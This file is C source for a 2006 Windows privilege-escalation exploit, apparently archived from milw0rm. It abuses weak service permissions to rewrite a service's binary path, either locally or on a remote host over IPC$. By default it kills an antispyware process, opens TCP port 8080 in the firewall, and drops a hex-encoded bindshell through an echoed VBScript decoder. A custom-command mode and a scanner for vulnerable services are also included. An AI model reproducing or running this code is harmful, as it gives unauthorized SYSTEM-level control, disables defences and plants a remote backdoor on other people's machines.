/*
 * Privilege Scalation for Windows Networks using weak Service restrictions v2.0
 * (c) 2006 Andres Tarasco AcuÃ±a ( atarasco _at_ gmail.com )
 * Date: February 6, 2006 - http://www.haxorcitos.com
 * http://microsoft.com/technet/security/advisory/914457.mspx
 *
 * ---------------------------------------
 * LIST OF WELL KNOWN VULNERABLE SERVICES
 * ---------------------------------------
 *
 * * Windows XP with sp2
 *  - As Power User:
 *    service: DcomLaunch ( SYSTEM )
 *    Service: UpnpHost ( Local Service )
 *    Service: SSDPSRV (Local Service)
 *    Service: WMI (SYSTEM) <- sometimes as user also..
 *  - As User:
 *    Service: UpnpHost ( Local Service )
 *    Service: SSDPSRV (Local Service)
 *  - As Network Config Operators:
 *    service: DcomLaunch ( SYSTEM )
 *    Service: UpnpHost ( Local Service )
 *    Service: SSDPSRV (Local Service)
 *    Service: DHCP ( SYSTEM )
 *    Service: NetBT (SYSTEM - .sys driver)
 *    Service DnsCache (SYSTEM)
 *
 * * Windows 2000
 *  - As Power user
 *    service: WMI (SYSTEM)
 *
 *  * Third Part software (local & remote code execution)
 *    Service: [Pml Driver HPZ12] (HP Software - C:\WINNT\system32\spool\DRIVERS\W32X86\3\HPZipm12.exe)
 *    -Granted Full Control to Everyone Group.
 *
 *    Service: [Autodesk Licensing Service] (Autocad - C:\program files\Common files\Autodesk Shared\Service\AdskScSrv.exe)
 *    -Maybe related to: http://www.securityfocus.com/bid/16472
 *    -Autodesk Multiple Products Remote Unauthorized Access Vulnerability
 *
 *
 * IMPORTANT!! You should execute this tool without Admin privileges on the target system
 *  srvcheck.exe -? for information about usage.
 *
 * NOTE: This code compiles under Borland C++ Builder
 *
*/
#include <stdio.h>
#include <windows.h>

//Functions
void doFormatMessage( unsigned int dwLastErr );
void usage(void);
DWORD StartModifiedService(SC_HANDLE SCM, char *srv, BOOL dbg);
void ListVulnerableService(char *host);
char *GetOwner(char *servicio);


//Remove previously created files
char init[]="cmd.exe /c rd /Q /S \\HXR";
char antispyware[]="taskkill.exe  /IM gcasDtServ.exe";
char firewall[]="cmd.exe /c netsh firewall add portopening TCP 8080 SrvCheck ENABLE ALL";


char EncodedBackdoor[]=
"cmd.exe /c md \\HXR && " //Final Bindshell-code is an 804 bytes binary
//Encoded with Tarako Exe2vbs (http://www.haxorcitos.com)
"echo f= \"4D5A000001z3z04z5z01z9z40z35z50z3z665AB44CCD21z10z504500004C01030048585221z8zE0000F010B010600A8z3zBCz7zC0010000C00100006802z4z400004z3z04z3z04z7z04z7z2403000028\">\\HXR\\a.vbs && "
"echo f=f ^& \"02z6z02z5z10000010z4z10000010z6z10z11z880200003Cz83z6802000020z27z2E576F70z4zA6z3zC0010000A8z3zC001z14z200000602E615434z4zB6z3z68020000B8z3z6802z14z400000402E54\">>\\HXR\\a.vbs && "
"echo f=f ^& \"524Bz4z04z3z2003000004z3z2003z14z400000C0558BEC81ECF4010000538D850CFEFFFF56506801010000FF157402400033F65656566A066A016A02FF15700240008BD88D45F06A10505366C745F002\">>\\HXR\\a.vbs && "
"echo f=f ^& \"0066C745F21F908975F4FF15780240006A0153FF157C0240008D45F0565053FF15800240008945EC8945E88945E48D459C508D45AC505656566A015656682003400056C745AC44z3z668975DCC745D801\">>\\HXR\\a.vbs && "
"echo f=f ^& \"0100008975B88975B48975E0FF15680240005E5BC9C210z3zFE02z6zE402000073000080020000800D00008001000080z4zCC02z10zF202000070020000C402z10z100300006802z22zFE02z6zE40200\">>\\HXR\\a.vbs && "
"echo f=f ^& \"0073000080020000800D00008001000080z4z3D00575341536F636B65744100005753325F33322E646C6C0000440043726561746550726F636573734100004B45524E454C33322E646C6Cz4z636D6400\">>\\HXR\\a.vbs && "
"echo i=1 : t = \"\" : While i^<=len(f) : If mid(f,i,1) = \"z\" then>>\\HXR\\a.vbs && "
"echo a=i+1 : k = 0 : while mid(f,a,1)^<^>\"z\" : k = k*10 + mid(f,a,1) : a = a+1 : WEnd : i = a+1 : for a=1 to k : t = t + \"00\" : Next>>\\HXR\\a.vbs && "
"echo ElseIf mid(f,i,1) ^<^> \"z\" then : t = t ^& mid(f,i,2) : i = i+2 >>\\HXR\\a.vbs && "
"echo end if : WEnd : Set o = CreateObject(\"Scripting.FileSystemObject\") >>\\HXR\\a.vbs && "
"echo Set n = o.CreateTextFile(\"\\HXR\\a.exe\", ForWriting) : i = 1 : while i ^< len(t)>>\\HXR\\a.vbs && "
"echo f = Int(\"&H\" ^& Mid(t, i, 2)) : n.Write(Chr(f)) : i = i+2 : WEnd : n.Close>>\\HXR\\a.vbs && "
"echo Set s=CreateObject(\"WScript.Shell\") : s.run(\"\\HXR\\a.exe\")>>\\HXR\\a.vbs &&"
"\\HXR\\a.vbs /B";

BYTE LIST=0,HELP=0,BACKDOOR=1, STOP=0;
char RemoteHost[256];
char permission[256];

/******************************************************************************/
int main(int argc, char* argv[]) {

 SC_HANDLE SCM,Svc;
 DWORD ret,len;
 char CurrentUserName[256];
 char *newPath=NULL;
 char *host=NULL;
 char *user=NULL;
 char *pass=NULL;
 char *srv=NULL;
 int i;
 NETRESOURCE NET;
  SERVICE_STATUS_PROCESS StopStatus;

 printf(" Services Permissions checker v2.0\n");
 printf(" (c) 2006 Andres Tarasco - atarasco%cgmail.com\n\n",'@');

 if (argc==1) usage();
 for (i=1;i<argc;i++) {
    if ( (strlen(argv[i])==2) && (argv[i][0]=='-') ) {
        switch (argv[i][1]) {
            case 'l': LIST=1; break;
            case 'm': srv=argv[i+1]; i=i+1;break;
            case 'u': if (!host) usage(); user=argv[i+1]; i=i++; break;
            case 'p': if (!host) usage(); pass=argv[i+1]; i=i++; break;
            case 'H': host=argv[i+1]; i=i++; break;
            case 'c': newPath=argv[i+1]; i=i+1; BACKDOOR=0; break;
            case 's': STOP=1; break;
            case '?': HELP=1; usage(); break;
            default: printf("Unknown Parameter: %s\n",argv[i]);usage(); break;
        }
    }
 }

 if ((!LIST) && (!srv) )usage();

 if (host) { //InicializaciÃ³n.. ConexiÃ³n al sistema remoto..
    printf("[+] Trying to connect to remote SCM\n");
    sprintf(RemoteHost,"\\\\%s\\IPC$",host);
    printf("[+] Host: %s\n",RemoteHost);
    printf("[+] Username: %s\n",user);
    printf("[+] Password: %s\n",pass);

    NET.dwType = RESOURCETYPE_ANY;
    NET.lpProvider = NULL;
    NET.lpLocalName=NULL;
    NET.lpRemoteName = (char *)RemoteHost;
    ret=WNetAddConnection2(&NET,pass,user,CONNECT_COMMANDLINE);//CONNECT_PROMPT);//CONNECT_UPDATE_PROFILE);

    //verificaciÃ³n de errores de conexiÃ³n...
    if ( (ret!=NO_ERROR) && (user !=NULL) ) {
        if (ret==1219) { //connection already created. Disconnecting..
            printf("[-] Credentials mismatch. Removing old connection\n");
            WNetCancelConnection2(RemoteHost,NULL,TRUE);
            ret=WNetAddConnection2(&NET,pass,user,CONNECT_UPDATE_PROFILE);
        } else {
            if (ret==1326) { //usuario o contraseÃ±a incorrecta
             if (strchr(user,'\\')==NULL) {
                 sprintf(CurrentUserName,"localhost\\%s",user);
                printf("[-] Unknown Username or password\n");
                printf("[+] Trying \"%s\" as new username\n",CurrentUserName);
                ret=WNetAddConnection2(&NET,pass,CurrentUserName,CONNECT_UPDATE_PROFILE);
             }
            }
        }
        if (ret!=NO_ERROR) {
            printf("WNetAddConnection Failed to %s (%s/ %s)\n",RemoteHost,user,pass);
            doFormatMessage(GetLastError());
            exit(-1);
        }
    }
    printf("[+] Network Connection OK\n");

 } else {
    printf("[+] Trying to enumerate local resources\n");
    len=sizeof(CurrentUserName)-1;
    GetUserName(  CurrentUserName,&len);
    printf("[+] Username: %s\n",CurrentUserName);
 }


if (LIST) {
    ListVulnerableService(host);
    exit(1);
}

//SERVICE HACKS HERE!!


SCM = OpenSCManager(host,NULL,STANDARD_RIGHTS_WRITE | SERVICE_START );
if (!SCM){
    printf("[-] OpenScManager() FAILED\n");
    doFormatMessage(GetLastError());
    exit(-1);
}
if (STOP) {
    Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE | SERVICE_STOP);
} else {
    Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE);
}

if (Svc==NULL) {
    printf("[-] Unable to open Service %s\n",srv);
    exit(-1);
}

//        printf("[+] Using leetz skillz to execute backdoor =)\n");

//Delete previous installed

if (STOP) {
 printf("[+] Stopping previously running instances...\n");
 if (ControlService(Svc,SERVICE_CONTROL_STOP,&StopStatus)!=0) {
    doFormatMessage(GetLastError());

 }
 exit(-1);
}


 if (BACKDOOR) {
    printf("[+] Uninstalling previous backdoors\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,init,NULL,NULL,"",
        NULL,NULL,NULL);

        if (ret!=0) StartModifiedService(SCM,srv,0);

    printf("[+] Granting Remote bindshell Execution..\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,firewall,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Shutting down remote antispyware Service =)\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,antispyware,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Installing Backdoor Code...\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,EncodedBackdoor,NULL,NULL,"",
        NULL,NULL,NULL);
 } else { //Ejecutando parametros especificados con -c
    printf("[+] Sending custom commands to the service\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,newPath,NULL,NULL,"",
        NULL,NULL,NULL);
 }

 if (ret!=0) {
    printf("[+] The service have been succesfully modified =)\n");
    CloseServiceHandle(Svc);
    StartModifiedService(SCM,srv,1);
 } else {
    printf("[-] Service modification Failed\n");
    doFormatMessage(ret);
 }
 CloseServiceHandle(SCM);
 if (host) WNetCancelConnection2(RemoteHost,NULL,TRUE);
 return(1);
}

/******************************************************************************/
void doFormatMessage( unsigned int dwLastErr )  {
    LPVOID lpMsgBuf;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_IGNORE_INSERTS |
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        dwLastErr,
        MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
        (LPTSTR) &lpMsgBuf,
        0,
        NULL );
    printf("ErrorCode %i: %s\n", dwLastErr, lpMsgBuf);
    LocalFree( lpMsgBuf  );
}

/******************************************************************************/

DWORD StartModifiedService(SC_HANDLE SCM, char *srv, BOOL dbg) {

 SC_HANDLE Svc;
 DWORD Error;
 SERVICE_STATUS_PROCESS StartStatus;
 DWORD dwByteNeeded;

 DWORD dwOldCheckPoint;
 DWORD dwStartTickCount;
 DWORD dwWaitTime;

 Svc= OpenService( SCM, srv, SERVICE_ALL_ACCESS);

 if (Svc==NULL) {
    if (dbg) printf("[-] Unable to reopen service for starting..\n");
    return(-1);
 } else {
    if (dbg) printf("[+] Service Opened. Trying to Start... (wait a few seconds)\n");
 }

 if (!StartService(Svc,0,NULL)) {
    Error=GetLastError();
    if (Error==1053) {
        if (dbg) {
            printf("[+] StarteService() Error due to a non service application execution\n");
            printf("[+] Ignore it. Your application should be executed =)\n");
            if (BACKDOOR) {
                printf("[+] Now connect to port 8080 and enjoy your new privileges\n");
            }
        }
    } else {
        if (dbg) {
            printf("[-] Unable to start Service :/\n");
            doFormatMessage(Error);
        }
        return(Error);
    }

 } else {
        if (dbg) printf("[+]  Starting Service....\n");
        if (!QueryServiceStatusEx(
            Svc,             // handle to service
            SC_STATUS_PROCESS_INFO, // info level
            &StartStatus,              // address of structure
            sizeof(SERVICE_STATUS_PROCESS), // size of structure
            &dwByteNeeded) )              // if buffer too small
        {
            if (dbg) printf("[-] Unable to QueryServiceStatusEx() \n");
            return(-2);
        } else {

            //RevisiÃ³n de si arranca el servicio..
            // Save the tick count and initial checkpoint.
            dwStartTickCount = GetTickCount();
            dwOldCheckPoint = StartStatus.dwCheckPoint;
            while (StartStatus.dwCurrentState == SERVICE_START_PENDING)
            {
                if (dbg) printf("Wait Time: %i\n",StartStatus.dwWaitHint);
                dwWaitTime = StartStatus.dwWaitHint  / 10;
                if( dwWaitTime < 1000 )
                    dwWaitTime = 1000;
                else if ( dwWaitTime > 10000 )
                    dwWaitTime = 10000;
                Sleep( dwWaitTime );
                // Check the status again.

                if (!QueryServiceStatusEx(
                    Svc,             // handle to service
                    SC_STATUS_PROCESS_INFO, // info level
                    &StartStatus,              // address of structure
                    sizeof(SERVICE_STATUS_PROCESS), // size of structure
                    &dwByteNeeded ) )              // if buffer too small
                {
                    if (dbg) printf("[-] Unable to QueryServiceStatusEx() \n");
                    return(-2);
                }
                if ( StartStatus.dwCheckPoint > dwOldCheckPoint )
                {
                // The service is making progress.
                    dwStartTickCount = GetTickCount();
                    dwOldCheckPoint = StartStatus.dwCheckPoint;
                } else {
                    if(GetTickCount()-dwStartTickCount > StartStatus.dwWaitHint)
                    {
                        // No progress made within the wait hint
                        if (dbg) printf("el servicio no se ha arrancado...\n");
                        break;
                    }
                }
            }
        }
        CloseServiceHandle(Svc);
        if (StartStatus.dwCurrentState == SERVICE_RUNNING)
        {
            if (dbg) printf("[+] StartService SUCCESS.\n");
            return 1;
        }
        else
        {
            if (dbg) printf("\n[-] Service not started. \n");
        }
  }
  return(0);
}


/******************************************************************************/
/******************************************************************************/
void usage(void) {
    printf(" Usage:\n\t-l\t\t list vulnerable services\n");
    printf("\t-m <service>\t modify the configuration for that service\n");
    printf("\t-c <command>\t Command to execute throw remote service\n");
    printf("\t\t\t  by default. bindshell application will be used\n");
    printf("\t-H <Host>\t specify a remote host to connect ip/netbiosname)\n");
    printf("\t-u <user>\t if not seletected Default logon credentials used)\n");
    printf("\t-p <password>\t if not used Default logon credentials used)\n");
    printf("\t-?\t\t Extended information with samples\n");

    if (HELP) {
     printf(" examples:\n");
     printf("\tsrvcheck.exe -l (list local vulnerabilities)\n");
     printf("\tsrvcheck.exe -m service (spawn a shell at port 8080)\n");
     printf("\tsrvcheck.exe -m service -c \"cmd.exe /c md c:\\PWNED\"\n"),
     printf("\tsrvcheck -l -H host (list remote vulnerabilities)\n");
   }
   exit(-1);
}


/******************************************************************************/
void ListVulnerableService(char *host) {
 SC_HANDLE SCM;
 SC_HANDLE Svc;
 DWORD nResumeHandle;
 DWORD dwServiceType;
 LPENUM_SERVICE_STATUS_PROCESS lpServices;
 DWORD nSize = 0;
 DWORD nServicesReturned;
 unsigned int n;
 unsigned int l=0;
 DWORD dwByteNeeded;
 LPQUERY_SERVICE_CONFIG lpConfig;
 char *p;

    SCM = OpenSCManager(host,NULL,SC_MANAGER_ENUMERATE_SERVICE);
    if (!SCM){
        printf("[-] OpenScManager() FAILED\n");
        doFormatMessage(GetLastError());
        exit(-1);
    }
    nResumeHandle = 0;
    dwServiceType = SERVICE_WIN32 | SERVICE_DRIVER;
    lpServices = (LPENUM_SERVICE_STATUS_PROCESS) LocalAlloc(LPTR, 65535);
    if (!lpServices) {
        printf("[-] CRITICAL ERROR: LocalAlloc() Failed\n");
        exit(-1);
    }
    memset(lpServices,'\0',sizeof(lpServices));
    if (EnumServicesStatusEx(SCM, SC_ENUM_PROCESS_INFO,
        dwServiceType, SERVICE_STATE_ALL,
        (LPBYTE)lpServices, 65535,
        &nSize, &nServicesReturned,
        &nResumeHandle, NULL) == 0)
    {
        printf("EnumServicesStatusEx FAILED\n");
        exit(-1);
    }

    printf("[+] Listing Vulnerable Services...\n");
    for (n = 0; n < nServicesReturned; n++) {
        Svc = OpenService(SCM,lpServices[n].lpServiceName, SERVICE_CHANGE_CONFIG | SC_MANAGER_ENUMERATE_SERVICE |GENERIC_READ);
        if (Svc!=NULL) {
            l++;
            printf("\n    [%s]\t\t%s\n",lpServices[n].lpServiceName, lpServices[n].lpDisplayName);
            printf("    Status: 0x%x\n",lpServices[n].ServiceStatusProcess.dwCurrentState);
            if (!host) {
                p=GetOwner(lpServices[n].lpServiceName);
                if (p) {
                    printf("    Context:\t\t%s\n",p);
                } 
            }
    		dwByteNeeded = 0;
		    lpConfig = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 1024*8);
		    if (QueryServiceConfig(Svc, lpConfig, 1024*8, &dwByteNeeded)!=0) {
                printf("    Parameter:\t\t%s\n",lpConfig->lpBinaryPathName);
            }else {
                doFormatMessage(GetLastError());
            }
        }
    }
    printf("\n[+] Analyzed %i Services in your system\n",nServicesReturned);
    if (l>0) {
        printf("[+] You were Lucky. %i vulnerable services found\n",l);
    }   else {
        printf("[+] Your system is secure! Great! :/\n");
    }
     if (host) WNetCancelConnection2(RemoteHost,NULL,TRUE);
    CloseServiceHandle(SCM);
    LocalFree(lpServices);
    exit(1);
}

/*****************************************************************************/

char *GetOwner(char *servicio) {

 char path[256];
 HKEY hReg;
 DWORD len=sizeof(permission);

 sprintf(path,"SYSTEM\\CurrentControlSet\\Services\\%s",servicio);
 if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,path,0,KEY_QUERY_VALUE,&hReg)== ERROR_SUCCESS ) {
    if (RegQueryValueEx(hReg,"ObjectName",NULL,NULL,permission,&len)==ERROR_SUCCESS) {
        RegCloseKey(hReg);
        return(permission);
    }
    RegCloseKey(hReg);
 }
 return(NULL);
}

// milw0rm.com [2006-02-12]